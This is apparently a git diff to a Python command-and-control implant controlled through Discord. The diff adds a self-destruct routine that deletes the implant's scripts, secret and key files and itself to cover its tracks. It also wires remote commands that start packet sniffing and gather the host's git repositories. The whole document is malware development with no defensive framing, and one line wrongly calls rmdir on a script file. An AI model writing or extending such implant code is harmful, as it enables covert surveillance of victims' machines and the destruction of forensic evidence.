@@ -8,6 +8,9 @@ from cryptography.fernet import Fernet
 from os.path import exists
 import os
 import packetsniff
+from os import remove
+from sys import argv
+
 
 import time
 import json
@@ -39,6 +42,21 @@ def fetch_command():
         command = None
     return command
 
+def destruct():
+    try:
+        os.remove('c2_discord.py')
+        os.remove('c2_implant.py')
+        os.remove('packetsniff.py')
+        os.remove('secrets.json')
+        os.remove('finalkey.json')
+        os.rmdir('secret_img')
+        os.rmdir('raw_img')
+        os.rmdir('start.sh')
+        remove(argv[0])
+    except:
+        pass
+
+
 def parse_command(command):
     tokens = command.split(" ")
     if len(tokens) < 1:
@@ -53,14 +71,14 @@ def parse_command(command):
         if len(tokens) < 2:
             print('missing arguments')
             return
-        #insert sniff toggle here
+        packetsniff.sniff()
     elif keyphrase == "repos":
         packetsniff.get_git_repos()
     elif keyphrase == "sd":
         if len(tokens) < 2:
             print('missing arguments')
             return
-        #insert self destruct code here
+        destruct()
     elif keyphrase == "setsleep":
         if len(tokens) < 2:
             print('missing arguments')
